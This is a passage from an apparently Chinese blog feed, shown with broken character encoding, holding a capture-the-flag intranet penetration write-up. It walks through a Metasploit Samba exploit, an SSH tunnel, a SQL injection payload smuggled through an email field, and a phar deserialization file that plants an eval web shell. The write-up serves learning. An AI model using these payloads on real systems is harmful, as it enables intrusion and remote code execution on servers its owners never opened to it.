title="å°è¯•å¯¹139å’Œ445ç«¯å£æ¸—é€"></a>å°è¯•å¯¹139å’Œ445ç«¯å£æ¸—é€</h2><p>å…ˆé’ˆå¯¹ä¸Šé¢çš„139å’Œ445è¿™ä¸¤ä¸ªå¸¸è§çš„å±é™©ç«¯å£è¿›è¡Œæ¸—é€ï¼Œmsfæœ‰ç›¸å…³çš„åˆ©ç”¨æ¨¡å—ï¼Œè¯¥è·³æ¿æœºå·²ç»ç»™æˆ‘ä»¬é…ç½®äº†msf</p><p>445ç«¯å£å­˜åœ¨smbæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">search ms17_010  #msfæœç´¢ä¸€ä¸‹ç›¸å…³æ¨¡å—<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506134.png" alt="image-20240424220514692"></p><p>å…ˆä½¿ç”¨æ‰«ææ¨¡å—å¯¹é¶æœºè¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/smb/smb_ms17_010<br>set rhost 172.2.90.6<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506135.png" alt="image-20240424220815110"></p><p>emmmä¼¼ä¹æ²¡æœ‰æ¼æ´</p><p>é‚£æ¢ä¸€ä¸ª139ç«¯å£çœ‹çœ‹ï¼Œ139ç«¯å£å­˜åœ¨sambaæœåŠ¡</p><p>é‚£å†ç”¨expæ‰“ä¸€ä¸‹è¿™ä¸ªç«¯å£çœ‹çœ‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">search samba<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506136.png" alt="image-20240424221712993"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/linux/samba/is_known_pipename<br>set rhost 172.2.90.6<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506137.png" alt="image-20240424222007305"></p><p>ç„¶ååœ¨rootä¸‹é¢çœ‹åˆ°flag</p><p><img src="http://cdn.clown2024.cn/202407151506138.png" alt="image-20240424222049190"></p><h2 id="çœ‹çœ‹webé¡µé¢"><a href="#çœ‹çœ‹webé¡µé¢" class="headerlink" title="çœ‹çœ‹webé¡µé¢"></a>çœ‹çœ‹webé¡µé¢</h2><p>å¾ˆå¥‡æ€ªä¸Šé¢ä¸€ä¸‹å­å°±æ‰“å‡ºæ¥flagæœ‰ç‚¹å®¹æ˜“ï¼ˆ</p><p>é‚£å°±æ¥çœ‹ä¸€ä¸‹webé¡µé¢å§ï¼Œé¡ºä¾¿å­¦å­¦sshéš§é“ï¼Œä¸€å¼€å§‹æƒ³ç”¨frpä»£ç†ä½†æ˜¯ä¸å‡ºç½‘</p><p>åšä¸€ä¸ªsshéš§é“è½¬å‘</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh -CfNg -L (æœ¬åœ°ç«¯å£):(ç›®æ ‡ä¸»æœºip):(ç›®æ ‡ä¸»æœºç«¯å£) (è·³æ¿æœºç”¨æˆ·å)@(è·³æ¿æœºip) -p (è·³æ¿æœºç«¯å£)</span><br>ssh -CfNg -L 80:172.2.90.5:80 ctfshow@pwn.challenge.ctf.show -p 28260<br></code></pre></td></tr></table></figure><p>é¢æ€ªäº†ä¸€ç›´è¯´è¯†åˆ«ä¸äº†ä¸»æœº</p><p><img src="http://cdn.clown2024.cn/202407151506139.png" alt="image-20240424231544798"></p><p>æœ€åç”¨termiusçš„port forwardingåšäº†ä¸€ä¸ªsshéš§é“æ˜ å°„åˆ°æœ¬åœ°çš„8081ç«¯å£</p><p><img src="http://cdn.clown2024.cn/202407151440712.png" alt="image-20240427011859538"></p><p>ç„¶åè®¿é—®æœ¬åœ°çš„8081ç«¯å£å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151440713.png" alt="image-20240427011939005"></p><p>ç„¶åç‚¹å‡»ä¸‹å›¾çš„ä½ç½®ä¼šè·³åˆ°è¯¥é¡¹ç›®çš„giteeä»“åº“ï¼Œé‡Œé¢æœ‰æºç ï¼Œå¯ä»¥ä¸‹è½½ä¸‹æ¥ä»£ç å®¡è®¡</p><p><img src="http://cdn.clown2024.cn/202407151506140.png" alt="image-20240427012117285"></p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p><img src="http://cdn.clown2024.cn/202407151506141.png" alt="image-20240427013405249"></p><p>çœ‹äº†å‰ç«¯çš„é¡µé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ä»–ä¼šå‘api&#x2F;index.phpå‘é€è¯·æ±‚ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹apiç›®å½•</p><p><img src="http://cdn.clown2024.cn/202407151440716.png" alt="image-20240427013625445"></p><p>å‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶</p><p><strong>config.php</strong></p><p><img src="http://cdn.clown2024.cn/202407151506142.png" alt="image-20240427013705919"></p><p>æ•°æ®åº“åã€ç”¨æˆ·åã€å¯†ç æˆ‘ä»¬éƒ½çŸ¥é“äº†ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹æ³¨å…¥æˆ–è€…èƒ½ä¸èƒ½ç™»é™†åå°</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] ?? <span class="hljs-string">&quot;login&quot;</span>;<br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doLogin</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;reset&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doReset</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;view&#x27;</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doView</span>();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doDefault</span>();<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506143.png" alt="image-20240427014000436"></p><p>å¯ä»¥å¾—çŸ¥è¯¥ç³»ç»Ÿé€šè¿‡ç»™aä¼ å‚ï¼Œæ ¹æ®ä¼ å‚çš„ä¸åŒå»å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¸€ä¸ªåŠŸèƒ½ç”±ä¸€ä¸ªå‡½æ•°æ‰§è¡Œ</p><p><strong>doLogin()åŠŸèƒ½</strong></p><p>é¦–å…ˆæ¥å®¡ä¸€ä¸‹ç™»é™†åŒºçš„åŠŸèƒ½</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$password</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;set name <span class="hljs-subst">$charName</span>&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select password from user where username = &#x27;<span class="hljs-subst">$username</span>&#x27; and password = &#x27;<span class="hljs-subst">$password</span>&#x27; limit 0,1;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>]===<span class="hljs-variable">$password</span>)&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]=<span class="hljs-literal">true</span>;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç™»é™†å¤±è´¥&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;LOGIN&#x27;</span>]?<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../ckfinder/ckfinder.html&quot;</span>):<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doFilter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;%27&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;%22&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;%5c&quot;</span>, <span class="hljs-variable">$str</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰é¢„ç¼–è¯‘å¾ˆæ˜æ˜¾æ˜¯å¯ä»¥sqlæ³¨å…¥çš„ï¼Œè¿™é‡Œå¯¹usernameå’Œpasswordè¿›è¡Œäº†ä¸€äº›è¿‡æ»¤ï¼Œå°†â€™ã€â€ã€\éƒ½æ¢æˆå¯¹åº”çš„urlç¼–ç çš„å­—ç¬¦ä¸²ã€‚ç„¶ååˆ¤æ–­ç™»é™†æ˜¯å¦æˆåŠŸçš„é€»è¾‘å°±æ˜¯ï¼Œä¸æŸ¥è¯¢å›æ¥å¯¹åº”ç”¨æˆ·åçš„passwordæ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰åˆ™sessonçš„loginå‚æ•°ä¸ºtrueï¼Œç„¶åè·³è½¬åˆ°ç™»é™†åçš„é¡µé¢ã€‚</p><p>ä½†æ˜¯çœ‹ä¸Šå»æœ‰ç‚¹éš¾æ³¨å…¥ï¼Œç™»é™†ä¸äº†adminï¼Œçœ‹äº†ä¸€ä¸‹doResetåŠŸèƒ½æ²¡æœ‰doFilterè¿‡æ»¤ï¼Œæœ‰ç‚¹æœºä¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doReset</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;email&#x27;</span>,FILTER_VALIDATE_EMAIL);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doFilter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpwd</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>())&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;set name <span class="hljs-subst">$charName</span>&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select email from user where email = &#x27;<span class="hljs-subst">$email</span>&#x27; and username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>])&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;RESET&#x27;</span>]=<span class="hljs-literal">true</span>;<br><span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&quot;ä½ å¥½ï¼ å·²ç»å°†é‡ç½®å¯†ç é“¾æ¥å‘é€è‡³é‚®ç®±&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;email;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;RESET&#x27;</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&quot;é‚®ç®±ä¸å­˜åœ¨&quot;</span>;<br>&#125;<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dispatcher</span>(<span class="hljs-string">&quot;../index.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥åœ¨ä¼ emailå‚æ•°æ—¶åªéœ€è¦ç¬¦åˆé‚®ç®±è§„åˆ™å°±å¯ä»¥éšä¾¿æ³¨å…¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#x27;/**/union/**/select/**/password/**/from/**/user#@qq.com<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506144.png" alt="image-20240427102704985"></p><p><img src="http://cdn.clown2024.cn/202407151440720.png" alt="image-20240427102633626"></p><p>ä¸€å¼€å§‹å°è¯•ç”¨whereæƒ³ç€æŒ‡å®šusernameä½†æ˜¯å°±ä¼šå¼¹å‡ºé‚®ç®±ä¸å­˜åœ¨ï¼Œä»–è¿™é‡Œçš„ç”¨æˆ·åæ˜¯ctfshowæˆ‘ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯adminï¼Œä¸è¿‡çŸ¥é“äº†ä¹‹åå¸¦ä¸Šwhereè¿˜æ˜¯ä¸è¡Œï¼Œä¼°è®¡æ˜¯ä¸ç¬¦åˆä»–å‡½æ•°çš„é‚®ç®±æ ¼å¼ï¼Œè¿”å›NULLäº†ç›´æ¥ã€‚</p><p><strong>æ–‡ä»¶ä¸Šä¼ </strong></p><p><img src="http://cdn.clown2024.cn/202407151506145.png" alt="image-20240427103330840"></p><p>ç™»é™†è¿›å»ä¹‹åå°±æ˜¯ä¸€ä¸ªç»å…¸çš„åå°æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆå»çœ‹çœ‹æºç æœ‰æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><p>å˜¶å‘ç°æºç çœ‹ä¸äº†ï¼Œä¼ äº†ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ä¸Šå»çœ‹äº†ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151506146.png" alt="image-20240427103952374"></p><p>å»çœ‹äº†ä¸€ä¸‹doView()å‡½æ•°ï¼Œä»–çš„å›¾ç‰‡åº”è¯¥æ˜¯æ”¾åœ¨userfilesçš„ç›®å½•ä¸‹é¢</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doView</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSession</span>();<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))&#123;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="hljs-variable">$file</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†å»æŠ“äº†ä¸ªåŒ…çœ‹äº†ä¸€ä¸‹ï¼Œå…·ä½“çš„è·¯å¾„å¦‚ä¸‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407151506147.png" alt="image-20240427110639504"></p><p>å°è¯•èƒ½ä¸èƒ½ä¸Šä¼ .phpæ–‡ä»¶ï¼ŒæŠ“äº†ä¸ªåŒ…ä½†æ˜¯å‘ç°æ ¡éªŒåœ¨å‰ç«¯å®Œæˆï¼Œåç«¯åšçš„å°±æ˜¯åˆ·æ–°ä¸€ä¸‹è¿™ä¸ªé¡µé¢</p><p><img src="http://cdn.clown2024.cn/202407151506148.png" alt="image-20240427110855204"></p><p><img src="http://cdn.clown2024.cn/202407151506149.png" alt="image-20240427110939934"></p><p>çœ‹æ¥ç›´æ¥ä¼ åº”è¯¥æ˜¯ä¸è¡Œäº†</p><p><strong>sendResetMail</strong></p><p>å†æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResetMail</span>(<span class="hljs-params"><span class="hljs-variable">$mail</span></span>)</span>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;ä½ å¥½ï¼Œä¸‹é¢æ˜¯ä½ çš„é‡ç½®å¯†ç é“¾æ¥ï¼Œè¯·å¤åˆ¶åˆ°æµè§ˆå™¨åœ°å€æ æ‰“å¼€.&quot;</span>;<br><span class="hljs-variable">$content</span>.= <span class="hljs-string">&quot;http://xxx.com/?token=xxxx&amp;email=<span class="hljs-subst">$mail</span>&quot;</span>;<br><br><span class="hljs-comment">//åŠŸèƒ½æš‚æœªå®ç°ï¼Œå…ˆä¿ç•™é‚®ä»¶ï¼Œä»¥åå‘é€</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;../mail_cache/cache.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php exit(&#x27;<span class="hljs-subst">$content</span>&#x27;);?&gt;&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªfile_put_contents()å‡½æ•°ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å†™ç è¿›å»ï¼Œçœ‹ä¸€ä¸‹å“ªé‡Œå¼•ç”¨äº†è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151440726.png" alt="image-20240427104655565"></p><p>å…ˆæ˜¯clearè¿™é‡Œå¼•ç”¨äº†ä¸€ä¸‹ï¼Œå†å»çœ‹å“ªé‡Œå¼•ç”¨äº†clear</p><p><img src="http://cdn.clown2024.cn/202407151506150.png" alt="image-20240427105001364"></p><p>å¯ä»¥çœ‹åˆ°__wakeup()é­”æœ¯æ–¹æ³•å¼•ç”¨äº†clearï¼Œä½†æ˜¯å†å¾€ä¸Šæ‰¾å°±æ²¡æœ‰äº†ï¼Œæƒ³è¦è§¦å‘çš„è¯å°±éœ€è¦ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæ²¡æœ‰ååºåˆ—åŒ–çš„å…¥å£</p><p>è¿™æ—¶å€™å°±å¯ä»¥æƒ³åˆ°pharäº†ï¼Œæ¯•ç«Ÿæˆ‘ä»¬è¿˜æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œé‚£è¦æ€ä¹ˆè§¦å‘pharå‘¢ï¼Œä¸Šé¢çœ‹è¿‡çš„doViewå‡½æ•°å°±å¯ä»¥</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doView</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSession</span>();<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))&#123;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="hljs-variable">$file</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¸è¿çš„æ˜¯è¿™é‡Œçš„fileå‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„</p><p>é‚£åˆ©ç”¨æ¡ä»¶è¾¾æˆï¼Œç°åœ¨å°±æ˜¯ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œåç¼€æ”¹æˆpngæˆ–è€…jpgå³å¯ï¼Œæ¯•ç«Ÿpharæ–‡ä»¶æ˜¯ä¸ä»¥åç¼€åæ¥è¾¨è®¤äº†,æ³¨æ„è¿™é‡Œè¿˜è¦å†™ä¸€ä¸ªçœŸçš„å›¾ç‰‡æ–‡ä»¶è¿›å»ï¼Œä¸€å¼€å§‹æ²¡å†™æ”¹äº†åç¼€è¿˜æ˜¯ä¸è¡Œã€‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//phar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">action</span></span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-variable">$email</span>=<span class="hljs-string">&quot;&#x27;.eval(\$_POST[1]));//&quot;</span>; <span class="hljs-comment">//è¿™æ ·å†™æ˜¯ä¸ºäº†é—­åˆé—­åˆå‰é¢çš„exitç„¶åæ³¨é‡Šåé¢çš„è¯­å¥</span><br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;test1.png&#x27;</span>).<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//è®¾ç½®stubæ ‡å¿—,å†™ä¸€ä¸ªçœŸçš„jpgæ–‡ä»¶è¿›å»ä¿è¯ç­‰ä¼šèƒ½å¤Ÿä¸Šä¼ æˆåŠŸ</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">action</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$o</span>));<span class="hljs-comment">//è®¾ç½®è‡ªå®šä¹‰çš„meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;hello~&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">php -d phar.readonly=0 phar.php<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506151.png" alt="image-20240427115006368"></p><p>ä¸Šä¼ æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬ç›´æ¥å»ç”¨pharä¼ªåè®®è¯»å–è¿™ä¸ªå›¾ç‰‡å°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ç å†™åˆ°<code>../mail_cache/cache.php</code>è¿™ä¸ªåœ°æ–¹äº†</p><p>æŠ“åŒ…æ‰¾åˆ°è·¯å¾„</p><p><img src="http://cdn.clown2024.cn/202407151506152.png" alt="image-20240427115434070"></p><p>ç„¶åå»api&#x2F;index.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">file=phar:///var/www/html/ckfinder/userfiles/web859.png<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151506153.png" alt="image-20240427115556308"></p><p>ç„¶åç›´æ¥èšå‰‘è¿æ¥<a href="http://127.0.0.1:8081/mail_cache/cache.php%E5%8D%B3%E5%8F%AF">http://127.0.0.1:8081/mail_cache/cache.phpå³å¯</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wafç»•è¿‡å­¦ä¹ </title>
      <link href="/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
